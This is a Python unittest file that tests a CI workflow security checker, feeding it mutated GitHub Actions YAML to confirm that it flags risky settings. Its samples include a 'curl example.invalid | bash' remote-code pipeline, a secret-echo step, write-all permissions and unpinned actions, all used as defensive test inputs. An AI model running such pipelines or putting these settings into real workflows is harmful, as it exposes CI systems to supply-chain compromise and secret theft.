# SPDX-License-Identifier: MIT
"""Synthetic public CI policy regression checks without external dependencies."""
from pathlib import Path
import importlib.util
import unittest

ROOT = Path(__file__).resolve().parents[1]
spec = importlib.util.spec_from_file_location(
    "workflow_gate", ROOT / "tools/security/check_workflows.py"
)
gate = importlib.util.module_from_spec(spec)
spec.loader.exec_module(gate)

SAFE = """name: safe
on:
  pull_request:
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
"""

class WorkflowPolicyTests(unittest.TestCase):
    def test_expected_safe_workflow(self):
        self.assertEqual(gate.check(SAFE), [])

    def test_block_self_hosted_and_target_event(self):
        issues = gate.check(SAFE.replace("pull_request:", "pull_request_target:").replace(
            "ubuntu-latest", "self-hosted"
        ))
        self.assertIn("untrusted privileged event", issues)
        self.assertIn("self-hosted runner", issues)

    def test_block_write_tokens_and_secrets(self):
        issues = gate.check(SAFE.replace("contents: read", "contents: write") +
                            "      - run: echo secrets.TOKEN\n")
        self.assertIn("token write permission", issues)
        self.assertIn("secret expression", issues)

    def test_block_dynamic_or_secondary_runner(self):
        multi = SAFE + "  another-job:\n    runs-on: vars.RUNNER\n"
        self.assertIn("every job must use literal GitHub-hosted ubuntu-latest",
                      gate.check(multi))

    def test_block_write_all_and_unpinned_container(self):
        altered = SAFE.replace("contents: read", "permissions: write-all")
        altered += "      - uses: docker://sample:latest\n"
        issues = gate.check(altered)
        self.assertIn("write-all permission is forbidden", issues)
        self.assertIn("remote actions must use 40-character commit pins", issues)

    def test_block_remote_shell_pipeline(self):
        issues = gate.check(SAFE + "      - run: curl example.invalid | bash\n")
        self.assertIn("remote shell pipelining is forbidden", issues)

    def test_block_mutable_action(self):
        issues = gate.check(SAFE.replace(
            "actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683",
            "actions/checkout@v4"
        ))
        self.assertIn("floating action reference", issues)

if __name__ == "__main__":
    unittest.main()
